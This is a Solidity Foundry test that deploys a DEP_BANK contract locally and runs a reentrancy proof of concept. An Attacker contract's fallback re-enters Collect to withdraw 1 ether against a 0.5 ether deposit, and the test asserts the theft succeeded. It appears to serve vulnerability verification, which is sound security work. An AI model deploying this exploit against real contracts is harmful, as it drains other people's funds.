// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../src/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol";

contract ReentrancyTest is Test {
    DEP_BANK public bank;
    LogFile public logger;
    Attacker public attacker;
    address payable victim = payable(address(0x12345));

    function setUp() public {
        // Deploy contracts
        logger = new LogFile();
        bank = new DEP_BANK();
        
        // Configure bank settings
        bank.SetLogFile(address(logger));
        bank.SetMinSum(0);

        // Setup victim account
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        bank.Deposit{value: 1 ether}();

        // Deploy and fund attacker contract
        attacker = new Attacker(payable(address(bank)));
        vm.deal(address(attacker), 0.5 ether);
        attacker.deposit();
    }

    function testReentrancy() public {
        // Verify initial balances
        assertEq(address(bank).balance, 1.5 ether, "Initial bank balance incorrect");
        assertEq(address(victim).balance, 0, "Victim starting balance incorrect");
        assertEq(address(attacker).balance, 0, "Attacker starting balance incorrect");
        
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerDepositBefore = bank.balances(address(attacker));
        uint256 victimDepositBefore = bank.balances(victim);

        console.log("Bank balance: ", bankBalanceBefore);
        console.log("Attacker balance: ", attackerBalanceBefore);
        console.log("Attacker deposit in bank: ", attackerDepositBefore);
        console.log("Victim deposit in bank: ", victimDepositBefore);

        console.log("--- Trigger Attack ---");
        attacker.attack();

        console.log("--- AFTER-Trigger Attack ---");
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerDepositAfter = bank.balances(address(attacker));
        uint256 victimDepositAfter = bank.balances(victim);

        console.log("Bank balance: ", bankBalanceAfter);
        console.log("Attacker balance: ", attackerBalanceAfter);
        console.log("Attacker deposit in bank: ", attackerDepositAfter);
        console.log("Victim deposit in bank: ", victimDepositAfter);

        uint256 bankDiff = bankBalanceBefore - bankBalanceAfter;
        uint256 attackerDiff = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Bank balance decrease: ", bankDiff);
        console.log("Attacker balance increase: ", attackerDiff);

        bool vulnerable = (bankDiff == 1 ether) && (attackerDiff == 1 ether);
        console.log("Differential Analysis: Reentrancy exploited?", vulnerable ? "YES" : "NO");

        // Original assertions remain for verification
        assertEq(address(attacker).balance, 1 ether, "Attacker should have stolen 1 ether");
        assertEq(address(bank).balance, 0.5 ether, "Bank balance should be reduced to 0.5 ether");
        assertEq(address(victim).balance, 0, "Victim balance unchanged");

        // Final vulnerability verdict
        if (vulnerable) {
            console.log("Vulnerability Exists: Reentrancy allowed attacker to steal 1 ether from bank");
        } else {
            console.log("Vulnerability not Exist: No unexpected balance changes detected");
        }
    }
}

contract Attacker {
    DEP_BANK public bank;
    uint private count;

    constructor(address payable _bank) {
        bank = DEP_BANK(_bank);
    }

    function deposit() public {
        bank.Deposit{value: address(this).balance}();
    }

    function attack() public {
        bank.Collect(0.5 ether);
    }

    fallback() external payable {
        count++;
        if (count == 1) {
            bank.Collect(0.5 ether);
        }
    }
}